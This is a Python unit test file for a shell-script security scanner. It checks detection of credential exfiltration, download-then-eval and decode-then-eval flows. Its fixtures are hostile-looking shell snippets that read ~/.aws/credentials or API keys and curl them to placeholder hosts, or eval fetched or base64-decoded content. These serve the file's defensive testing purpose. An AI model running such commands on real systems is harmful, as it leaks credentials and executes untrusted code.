"""Separate request inputs from captured response bytes; preserve executable sources."""
import unittest
from test_qindun_certify import MODULE
scan = MODULE._shell_flow_findings
response_only = MODULE.shell_curl_response_only

CASES = [
    ["response_auth","KEY=\"$API_KEY\"\nDATA=$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid)\ncurl --data \"$DATA\" https://other.invalid",[[2,"candidate"]]],
    ["direct_env_response","DATA=$(curl -H \"Authorization: Bearer $API_KEY\" https://example.invalid)\ncurl --data \"$DATA\" https://other.invalid",[[1,"candidate"]]],
    ["response_alias","KEY=\"$API_KEY\"\nDATA=$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid)\nOTHER=\"$DATA\"\ncurl --data \"$OTHER\" https://other.invalid",[[2,"candidate"]]],
    ["request_body","KEY=\"$API_KEY\"\nDATA=$(curl --data \"$KEY\" https://example.invalid)\ncurl --data \"$DATA\" https://other.invalid",[[2,"confirmed"]]],
    ["request_raw","KEY=\"$API_KEY\"\nDATA=$(curl --data-raw \"$KEY\" https://example.invalid)\ncurl --data \"$DATA\" https://other.invalid",[[2,"confirmed"]]],
    ["request_file","DATA=$(curl --data-binary @~/.aws/credentials https://example.invalid)\ncurl --data \"$DATA\" https://other.invalid",[[1,"confirmed"]]],
    ["request_file_header","KEY=$(cat ~/.aws/credentials)\nDATA=$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid)\ncurl --data \"$DATA\" https://other.invalid",[[2,"confirmed"]]],
    ["self_assignment","KEY=\"$API_KEY\"\nKEY=$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid)\ncurl --data \"$KEY\" https://other.invalid",[[2,"candidate"]]],
    ["mixed","KEY=\"$API_KEY\"\nDATA=$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid)\ncurl --data \"$DATA\" https://other.invalid\ncurl --data \"$KEY\" https://other.invalid",[[2,"candidate"],[4,"confirmed"]]],
    ["unknown_writeout","KEY=\"$API_KEY\"\nDATA=$(curl -w \"$KEY\" https://example.invalid)\ncurl --data \"$DATA\" https://other.invalid",[[2,"confirmed"],[3,"confirmed"]]],
    ["unknown_protocol","KEY=\"$API_KEY\"\nDATA=$(curl file:///\"$KEY\")\ncurl --data \"$DATA\" https://other.invalid",[[2,"confirmed"],[3,"confirmed"]]],
    ["literal_assignment","KEY=\"$API_KEY\"\nDATA='$(curl --data \"$KEY\" https://example.invalid)'\ncurl --data \"$DATA\" https://other.invalid",[]],
    ["plain_variable","KEY=\"$API_KEY\"\nDATA=\"$KEY\"\ncurl --data \"$DATA\" https://other.invalid",[[3,"confirmed"]]],
    ["real_file","DATA=$(cat ~/.aws/credentials)\ncurl --data \"$DATA\" https://other.invalid",[[2,"confirmed"]]],
    ["no_auth","DATA=$(curl https://example.invalid)\ncurl --data \"$DATA\" https://other.invalid",[]],
    ["public_auth","KEY=public\nDATA=$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid)\ncurl --data \"$DATA\" https://other.invalid",[]],
    ["response_stdout_echo","KEY=\"$API_KEY\"\nDATA=$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid)\necho \"$DATA\" | curl --data-binary @- https://other.invalid",[[2,"candidate"]]],
    ["response_default","KEY=\"$API_KEY\"\nDATA=$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid)\ncurl --data \"${DATA:-public}\" https://other.invalid",[[2,"candidate"]]],
    ["request_default","KEY=\"$API_KEY\"\nDATA=$(curl --data \"${KEY:-public}\" https://example.invalid)\ncurl --data \"$DATA\" https://other.invalid",[[2,"confirmed"]]],
    ["request_literal","KEY=\"$API_KEY\"\nDATA=$(curl --data '$KEY' https://example.invalid)\ncurl --data \"$DATA\" https://other.invalid",[]],
    ["request_raw_literal","KEY=\"$API_KEY\"\nDATA=$(curl --data-raw '$KEY' https://example.invalid)\ncurl --data \"$DATA\" https://other.invalid",[]],
    ["unknown_suffix","KEY=\"$API_KEY\"\nDATA=$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid)$KEY\ncurl --data \"$DATA\" https://other.invalid",[[2,"confirmed"],[3,"confirmed"]]],
    ["literal_then_real","KEY=\"$API_KEY\"\nDATA='$(curl --data \"$KEY\" https://example.invalid)'\ncurl --data \"$KEY\" https://other.invalid",[[3,"confirmed"]]],
    ["literal_path_text","DATA='curl --data @~/.aws/credentials https://example.invalid'",[]],
    ["public_literal_text","DATA='curl $API_KEY https://example.invalid'",[]],
]

FLOWS = [
    ["response_eval","KEY=\"$API_KEY\"\nDATA=$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid)\neval \"$DATA\"",True,False],
    ["response_python","DATA=$(curl https://example.invalid)\npython3 -c \"$DATA\"",True,False],
    ["decoded_request_response","CODE=$(echo cGFzcw== | base64 -d)\nDATA=$(curl --data \"$CODE\" https://example.invalid)\neval \"$DATA\"",True,False],
    ["decoded_direct","CODE=$(echo cGFzcw== | base64 -d)\neval \"$CODE\"",False,True],
    ["numeric_status","DATA=$(curl -o /tmp/result -w \"%{http_code}\" https://example.invalid)\neval \"$DATA\"",False,False],
    ["literal_download_text","DATA='$(curl https://example.invalid)'\neval \"$DATA\"",False,False],
    ["response_argument","DATA=$(curl https://example.invalid)\npython3 -c 'import sys; print(sys.argv[1])' \"$DATA\"",False,False],
    ["non_http_fallback","DATA=$(curl file:///tmp/input)\neval \"$DATA\"",True,False],
]


class ShellResponseAssignmentTests(unittest.TestCase):
    def test_response_credentials(self):
        for name, source, expected in CASES:
            with self.subTest(name=name):
                hits = scan("main.sh", source)
                actual = sorted([h.line, h.disposition] for h in hits
                                if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION")
                self.assertEqual(actual, expected)

    def test_execution_provenance(self):
        for name, source, download, decoded in FLOWS:
            with self.subTest(name=name):
                rules = {h.rule_id for h in scan("main.sh", source)}
                self.assertEqual("QINDUN.LOCAL.D3.DOWNLOAD_EXECUTION_FLOW" in rules, download)
                self.assertEqual("QINDUN.LOCAL.D3.DECODE_EXECUTION_FLOW" in rules, decoded)

    def test_unknown_response_shapes_defer(self):
        for source in [
            "$(curl -w \"$KEY\" https://example.invalid)",
            "$(curl -o /tmp/result https://example.invalid)",
            "$(curl file:///tmp/input)",
            "$(curl \"$URL\")",
            "$(wget https://example.invalid)",
            "$(curl https://example.invalid; echo \"$KEY\")",
            "$(curl --data \"$(read_key)\" https://example.invalid)",
            "$(curl https://example.invalid)$KEY",
        ]:
            with self.subTest(source=source):
                self.assertFalse(response_only(source))
